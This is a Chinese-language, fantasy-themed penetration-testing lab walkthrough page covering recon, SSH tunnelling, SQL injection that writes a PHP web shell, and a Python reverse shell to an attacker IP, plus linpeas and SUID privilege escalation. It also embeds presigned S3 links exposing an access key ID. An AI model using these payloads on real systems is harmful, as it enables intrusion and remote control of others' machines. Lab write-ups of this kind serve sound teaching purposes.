@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>勇者的 Linux 滲透旅程 D2</title>
+    <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+    <style>
+        /* RPG 風格樣式，保留原始元素但改為卷軸/奇幻配色 */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Noto Sans TC', 'Segoe UI', Tahoma, '微軟正黑體', serif; background: #efe6cf; color: #2b2b2b; padding: 24px; }
+        .container { max-width: 980px; margin: 0 auto; background: linear-gradient(180deg,#fffaf0,#fff4e6); border-radius: 12px; box-shadow: 0 18px 50px rgba(0,0,0,0.25); overflow: hidden; border: 6px solid #7a4b1c; }
+        header { background: linear-gradient(90deg,#7a4b1c,#a36b2b); color: #fff8e6; padding: 36px 20px; text-align: center; }
+        header h1 { font-size: 2em; margin-bottom: 6px; letter-spacing: 1px; }
+        header p { opacity: 0.95; }
+        .content { padding: 28px 22px; }
+        .chapter-title { background: linear-gradient(90deg,#f6ecd8,#f3e4c8); color: #5b3d1b; padding: 12px 16px; border-radius: 8px; margin: 20px 0 12px; font-size: 1.2em; border-left: 6px solid #a36b2b; }
+        .scene { margin-bottom: 20px; background: #fffaf6; padding: 18px; border-radius: 8px; border-left: 6px solid #c49a53; }
+        .scene h4 { color: #6b3f17; margin-bottom: 8px; }
+        .scene p { margin: 6px 0; }
+        .command-box { background: #1d1f20; color: #b8ffb2; padding: 12px; border-radius: 6px; font-family: monospace; overflow-x: auto; margin: 10px 0; font-size: 0.95em; white-space: pre-wrap; }
+        .detail-list { margin: 10px 0 0 0; padding-left: 18px; }
+        .detail-list li { margin: 6px 0; }
+        .note { background: #fff6e8; border-left: 5px solid #6b3f17; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        footer { background: #efe6cf; padding: 16px; text-align: center; color: #5b3d1b; border-top: 1px solid #e2d0b0; }
+        .metadata { display:flex; gap:12px; flex-wrap:wrap; margin-top:8px; color:#5b3d1b; }
+        .meta-item { background:#fff4df; padding:8px 10px; border-radius:6px; border:1px solid #e3cfae; }
+        .params { display:flex; gap:10px; flex-wrap:wrap; margin-bottom:10px; }
+        .param { background:#fff4df; padding:8px; border-radius:6px; border:1px solid #e3cfae; }
+        label { font-weight:600; margin-right:6px; color:#5b3d1b; }
+        input[type=text], input[type=number] { padding:6px 8px; border-radius:4px; border:1px solid #d8c9a6; }
+        .params { display:flex; gap:10px; flex-wrap:wrap; margin-bottom:10px; }
+        .param { background:#fff4df; padding:8px; border-radius:6px; border:1px solid #e3cfae; }
+        .diagram-container { background: #fffef8; padding:12px; border-radius:6px; margin:12px 0; border:1px solid #e6dcc4; }
+        @media (max-width: 768px) { header h1 { font-size:1.4em } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🛡️ 勇者的 Linux 滲透旅程 — D2</h1>
+            <p>每一步都是考驗：問題、思考、工具與解法的完整紀錄</p>
+            <div class="metadata">
+                <div class="meta-item">日期: 2025-12-08</div>
+                <div class="meta-item">生成時間: 2025-12-08T16:36:27.656Z</div>
+                <div class="meta-item">作者: 飛飛資安（勇者筆記）</div>
+            </div>
+        </header>
+
+        <div class="content">
+            <!-- Parameter inputs -->
+            <div class="chapter-title">參數設定（輸入後會自動更新頁內指令）</div>
+            <div class="scene">
+                <div class="params">
+                    <div class="param"><label for="ATTACKER_IP">ATTACKER_IP</label><input id="ATTACKER_IP" type="text" /></div>
+                    <div class="param"><label for="TARGET_IP">TARGET_IP</label><input id="TARGET_IP" type="text" /></div>
+                    <div class="param"><label for="JUMPBOX_HOST">JUMPBOX_HOST</label><input id="JUMPBOX_HOST" type="text" /></div>
+                    <div class="param"><label for="JUMPBOX_PORT">JUMPBOX_PORT</label><input id="JUMPBOX_PORT" type="number" /></div>
+                    <div class="param"><label for="LOCAL_PORT">LOCAL_PORT</label><input id="LOCAL_PORT" type="number" /></div>
+                    <div class="param"><label for="LISTEN_PORT">LISTEN_PORT</label><input id="LISTEN_PORT" type="number" /></div>
+                </div>
+                <p>範例預設值會被填入，修改後頁面上的命令會即時替換對應參數（{{PARAM_NAME}}）。</p>
+            </div>
+
+            <div class="chapter-title">序章：勇者出發</div>
+            <div class="scene">
+                <h4>狀態</h4>
+                <p>勇者攜帶著他的武器 (Kali) 與地圖 (目標 IP 與 Jumpbox)。在接下來的冒險中，勇者會遇到多種障礙：未知的服務、防火牆、可疑的表單，以及提升權限的機會。</p>
+            </div>
+
+            <div class="chapter-title">第一章：偵查 — 掃描與目錄探查</div>
+            <div class="scene">
+                <h4>遭遇的問題</h4>
+                <p>目標的對外服務不明，勇者不知道哪些門戶（埠）是開放的，也無從得知網頁是否隱藏了某些路徑。</p>
+                <div class="diagram-container"><img src="https://prd-felo-meet.s3.ap-northeast-1.amazonaws.com/search-ext-index-file/parse/06b25283-4257-4589-97f8-1071f1fd2773/generate.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20251209T053403Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3599&X-Amz-Credential=AKIA5M4ISMZHSPSGEVS5%2F20251209%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Signature=9598f3b47690162bd74483df27b8d9cf85952db60d4746b137bb18b235b575a8" alt="第一章 圖示" style="width:100%;border-radius:6px;"/></div>
+
+                <h4>思考過程</h4>
+                <ul class="detail-list">
+                    <li>先用快速掃描取得可見的服務，再以深度掃描確定版本與潛在漏洞。</li>
+                    <li>對 Web 服務做目錄爆破，以發現可能存在但未列在首頁的入口。</li>
+                </ul>
+
+                <h4>工具與使用方式</h4>
+                <ul class="detail-list">
+                    <li>nmap — 掃描開放埠與版本</li>
+                    <li>dirb 或 gobuster — 爆目錄以找隱藏頁面</li>
+                    <li>curl — 檢視單一頁面內容</li>
+                </ul>
+
+                <h4>實作指令</h4>
+                <div class="command-box" data-template="$ nmap -sC -sV {{TARGET_IP}}">$ nmap -sC -sV {{TARGET_IP}}</div>
+                <div class="command-box" data-template="$ nmap --script=http-* -p 80 {{TARGET_IP}}">$ nmap --script=http-* -p 80 {{TARGET_IP}}</div>
+                <div class="command-box" data-template="$ dirb http://{{TARGET_IP}} /usr/share/wordlists/dirb/common.txt">$ dirb http://{{TARGET_IP}} /usr/share/wordlists/dirb/common.txt</div>
+                <div class="command-box" data-template="$ curl http://{{TARGET_IP}}/index.php">$ curl http://{{TARGET_IP}}/index.php</div>
+
+                <h4>解決過程</h4>
+                <p>勇者先以 nmap 找到開放的 80/443（若有），接著使用 http-* NSE 腳本確認 Web 服務常見問題。再以 dirb 尋找隱藏路徑，並用 curl 驗證頁面存在性。這些資訊匯集成地圖，指出下一個可能的攻擊入口。</p>
+            </div>
+
+            <div class="chapter-title">第二章：穿越跳跳島 — SSH 隧道與跳板</div>
+            <div class="scene">
+                <h4>遭遇的問題</h4>
+                <p>目標位於內部網路，無法直接由勇者的電腦訪問。需要透過跳板 (Jumpbox) 才能到達。</p>
+                <div class="diagram-container"><img src="https://prd-felo-meet.s3.ap-northeast-1.amazonaws.com/search-ext-index-file/parse/9beae5f4-6ccd-41ec-b709-afcd3dcd17ef/generate.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20251209T053506Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Credential=AKIA5M4ISMZHSPSGEVS5%2F20251209%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Signature=9f40b27adb2534e9ca6ea4a1f6ce02907c1dbcecab42736fc5333cd669d8763c" alt="第二章 圖示" style="width:100%;border-radius:6px;"/></div>
+
+                <h4>思考過程</h4>
+                <ul class="detail-list">
+                    <li>能否利用 SSH 埠轉發建立一個本地入口？</li>
+                    <li>通過本地端口訪問目標，就像在內部網路一樣。</li>
+                </ul>
+
+                <h4>工具與使用方式</h4>
+                <ul class="detail-list">
+                    <li>ssh - 本地端口轉發：把本地埠綁定到跳板再轉到目標</li>
+                </ul>
+
+                <h4>實作指令</h4>
+                <div class="command-box" data-template="$ ssh -L {{LOCAL_PORT}}:{{TARGET_IP}}:80 root@{{JUMPBOX_HOST}} -p {{JUMPBOX_PORT}}">$ ssh -L {{LOCAL_PORT}}:{{TARGET_IP}}:80 root@{{JUMPBOX_HOST}} -p {{JUMPBOX_PORT}}</div>
+                <div class="command-box" data-template="# 然後在本機瀏覽器訪問 http://localhost:{{LOCAL_PORT}}"># 然後在本機瀏覽器訪問 http://localhost:{{LOCAL_PORT}}</div>
+
+                <h4>解決過程</h4>
+                <p>勇者成功在本地建立了一條隧道，將外部瀏覽器流量安全地導向跳板，跳板再內部轉向目標。這讓勇者能夠像在內部網路中直接操作目標的 Web 服務。</p>
+            </div>
+
+            <div class="chapter-title">第三章：陷阱中的密語 — SQL 注入與 Web Shell</div>
+            <div class="scene">
+                <h4>遭遇的問題</h4>
+                <p>在某個表單或參數處，輸入似乎被資料庫直接使用，可能存在注入風險。勇者需要判斷是否能利用 SQL 注入讀寫檔案。</p>
+                <div class="diagram-container"><img src="https://prd-felo-meet.s3.ap-northeast-1.amazonaws.com/search-ext-index-file/parse/1cc7a2c8-1a2b-4360-a856-bc15ff2529fb/generate.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20251209T053518Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3599&X-Amz-Credential=AKIA5M4ISMZHSPSGEVS5%2F20251209%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Signature=a7bab0412e2c3995dc3116e24c6155c7708a57a86340cc523cec1dd6041d0787" alt="第三章 圖示" style="width:100%;border-radius:6px;"/></div>
+
+                <h4>思考過程</h4>
+                <ul class="detail-list">
+                    <li>先確認可注入的欄位數量與回顯位置（ORDER BY / UNION 測試）。</li>
+                    <li>找出能回顯資料的位置以放置 payload 或 PHP 代碼。</li>
+                    <li>評估資料庫權限是否允許 INTO OUTFILE 寫入網頁目錄。</li>
+                </ul>
+
+                <h4>工具與使用方式</h4>
+                <ul class="detail-list">
+                    <li>手動測試 + sqlmap（自動化識別 / 利用）</li>
+                    <li>使用 HTTP 請求直接在回顯參數插入 UNION SELECT payload</li>
+                </ul>
+
+                <h4>實作指令（範例）</h4>
+                <div class="command-box" data-template="# 測量欄位數量\n$ param=1 OR 1=1 ORDER BY 1 -- , ..."># 測量欄位數量\n$ param=1 OR 1=1 ORDER BY 1 -- , ...</div>
+                <div class="command-box" data-template="# UNION 回顯測試\n$ 0 UNION SELECT 1,2,3,4,5"># UNION 回顯測試\n$ 0 UNION SELECT 1,2,3,4,5</div>
+                <div class="command-box" data-template="# 嘗試寫入 Web Shell（若 DB 有權限）\n$ 0 UNION SELECT NULL,NULL,NULL,\"<?php system($_GET['cmd']); ?>\",NULL INTO OUTFILE '/var/www/html/shell.php'"># 嘗試寫入 Web Shell（若 DB 有權限）\n$ 0 UNION SELECT NULL,NULL,NULL,"<?php system($_GET['cmd']); ?>",NULL INTO OUTFILE '/var/www/html/shell.php'</div>
+                <div class="command-box" data-template="# 測試 shell\n$ http://localhost:{{LOCAL_PORT}}/shell.php?cmd=whoami"># 測試 shell\n$ http://localhost:{{LOCAL_PORT}}/shell.php?cmd=whoami</div>
+
+                <h4>解決過程</h4>
+                <p>勇者透過 ORDER BY 找到欄位數量，使用 UNION 找到可回顯欄位，並在可回顯的欄位放置 PHP 代碼嘗試 INTO OUTFILE。若成功，Web Shell 會讓勇者得以遠端執行命令，並進入下一階段（反彈 Shell）。</p>
+
+                <div class="note">
+                    防禦建議：資料庫使用者不應有 INTO OUTFILE 權限，並對輸入做參數化處理以防注入。
+                </div>
+            </div>
+
+            <div class="chapter-title">第四章：反彈之術 — 建立 Reverse Shell</div>
+            <div class="scene">
+                <h4>🎯 Reverse Shell vs Web Shell</h4>
+                <p>Web Shell 只能透過 HTTP 被動執行命令，而 Reverse Shell 則讓靶機主動連回以獲取互動式 shell。</p>
+                <div class="diagram-container"><img src="https://prd-felo-meet.s3.ap-northeast-1.amazonaws.com/search-ext-index-file/parse/50dc0385-b17d-4ccd-8c40-a80a1ec5a1b2/generate.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20251209T051529Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Credential=AKIA5M4ISMZHSPSGEVS5%2F20251209%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Signature=e0d2f64b4aaf436830f5977762d4d290ba925bf605da0f99bf80c849feaae97a" alt="第四章 圖示" style="width:100%;border-radius:6px;"/></div>
+
+                <h4>實作指令</h4>
+                <div class="command-box" data-template="# 攻擊者端監聽\n$ nc -lvnp {{LISTEN_PORT}}"># 攻擊者端監聽\n$ nc -lvnp {{LISTEN_PORT}}</div>
+                <div class="command-box" data-template="# Web Shell 執行的反彈 Payload（例：Python3）\n$ python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{ATTACKER_IP}}\",{{LISTEN_PORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'"># Web Shell 執行的反彈 Payload（例：Python3）\n$ python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{{ATTACKER_IP}}",{{LISTEN_PORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'</div>
+
+                <h4>解決過程</h4>
+                <p>勇者先在本地啟動 nc 監聽，再透過 Web Shell 在靶機上執行 payload，靶機成功連回後，勇者使用 python pty.spawn 升級為互動式 bash，完成穩定化。</p>
+            </div>
+
+            <div class="chapter-title">第五章：洞窟探查 — 權限偵測與 linpeas</div>
+            <div class="scene">
+                <h4>🔎 權限偵測</h4>
+                <p>拿到低權限 Shell 後，勇者需要快速找出可能的提權路徑（SUID、弱密碼、配置錯誤等）。</p>
+                <div class="diagram-container"><img src="https://prd-felo-meet.s3.ap-northeast-1.amazonaws.com/search-ext-index-file/parse/e41a0e3f-b411-4a0a-ba9b-253fb808f59e/generate.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20251209T052022Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Credential=AKIA5M4ISMZHSPSGEVS5%2F20251209%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Signature=9c708e0098b63fd99ebf62307d1b41a1694482e64173ff9f65f45dd7dc97f4c8" alt="第五章 圖示" style="width:100%;border-radius:6px;"/></div>
+
+                <h4>實作指令</h4>
+                <div class="command-box" data-template="$ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh">$ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh</div>
+                <div class="command-box" data-template="$ chmod +x linpeas.sh">$ chmod +x linpeas.sh</div>
+                <div class="command-box" data-template="$ ./linpeas.sh > linpeas_result.txt">$ ./linpeas.sh > linpeas_result.txt</div>
+                <div class="command-box" data-template="$ cat linpeas_result.txt">$ cat linpeas_result.txt</div>
+
+            </div>
+
+            <div class="chapter-title">第六章：皇冠的機遇 — SUID 與提權</div>
+            <div class="scene">
+                <h4>🔍 SUID 搜尋</h4>
+                <p>尋找系統的 SUID 檔案並查詢 GTFOBins 取得利用方式。</p>
+                <div class="diagram-container"><img src="https://prd-felo-meet.s3.ap-northeast-1.amazonaws.com/search-ext-index-file/parse/5b6eac14-3c57-4949-870a-13f6e87969e6/generate.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20251209T052654Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Credential=AKIA5M4ISMZHSPSGEVS5%2F20251209%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Signature=9d9eeb93027737ad61efa4764db3de84923f3303a79688b5254576cf6396a7a4" alt="第六章 圖示" style="width:100%;border-radius:6px;"/></div>
+
+                <h4>實作指令</h4>
+                <div class="command-box" data-template="$ find / -perm -u=s -type f 2>/dev/null">$ find / -perm -u=s -type f 2>/dev/null</div>
+                <div class="command-box" data-template="$ ls -al /usr/local/bin/bash_suid">$ ls -al /usr/local/bin/bash_suid</div>
+                <div class="command-box" data-template="# 於 GTFOBins 搜尋對應利用方法\n$ open https://gtfobins.github.io/gtfobins/"># 於 GTFOBins 搜尋對應利用方法\n$ open https://gtfobins.github.io/gtfobins/</div>
+
+                <div class="note">實務防禦：除非絕對必要，SUID 檔案應減少並審核其行為，避免放置可被濫用的二進位或腳本。</div>
+            </div>
+
+            <div class="chapter-title">終章：完整流程回顧</div>
+            <div class="scene">
+                <h4>勇者的冒險摘要</h4>
+                <div class="diagram-container"><img src="https://prd-felo-meet.s3.ap-northeast-1.amazonaws.com/search-ext-index-file/parse/9f1945f1-aa25-4c44-b79e-fd8bf80f82db/generate.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20251209T053224Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Credential=AKIA5M4ISMZHSPSGEVS5%2F20251209%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Signature=3cc18ed13f8173e75d95dc5feea0a50518c4e6dfade79ff7635209dd7d9772e7" alt="終章 圖示" style="width:100%;border-radius:6px;"/></div>
+                <ol class="detail-list">
+                    <li>偵查（nmap / dirb）：繪製目標地圖。</li>
+                    <li>跳板連線（ssh -L）：建立本地通道進入內網。</li>
+                    <li>注入（SQLi）：找出可回顯並嘗試寫入 Web Shell。</li>
+                    <li>反彈（Reverse Shell）：以 Python/nc 建立穩定互動式 Shell。</li>
+                    <li>偵測（linpeas）：快速找提權線索。</li>
+                    <li>提權（SUID + GTFOBins）：濫用不安全配置取得 root。</li>
+                </ol>
+            </div>
+
+        </div>
+
+        <footer>
+            <p>🧭 勇者筆記 • Linux 滲透測試 D2 | 2025 • 由 飛飛資安 整理</p>
+        </footer>
+    </div>
+
+    <script>
+        // parameter defaults
+        const defaults = {
+            ATTACKER_IP: '172.30.0.11',
+            TARGET_IP: '172.30.0.10',
+            JUMPBOX_HOST: 'dockerlab.feifei.tw',
+            JUMPBOX_PORT: '32922',
+            LOCAL_PORT: '5555',
+            LISTEN_PORT: '4444'
+        };
+
+        function applyParams(){
+            const params = {};
+            Object.keys(defaults).forEach(k=>{
+                const el = document.getElementById(k);
+                params[k] = (el && el.value) ? el.value : defaults[k];
+            });
+            document.querySelectorAll('[data-template]').forEach(el=>{
+                const tpl = el.getAttribute('data-template') || '';
+                const out = tpl.replace(/\{\{(\w+)\}\}/g, (m,key)=> params[key] || '');
+                el.textContent = out;
+            });
+            if (window.mermaid && typeof mermaid.init === 'function') {
+                try { mermaid.init(undefined, document.querySelectorAll('div.mermaid')); } catch(e) { console.warn('mermaid error', e); }
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', ()=>{
+            Object.keys(defaults).forEach(k=>{
+                const el = document.getElementById(k);
+                if(el) el.value = defaults[k];
+                if(el) el.addEventListener('input', applyParams);
+            });
+            applyParams();
+            mermaid.contentLoaded();
+        });
+    </script>
+</body>
+</html>
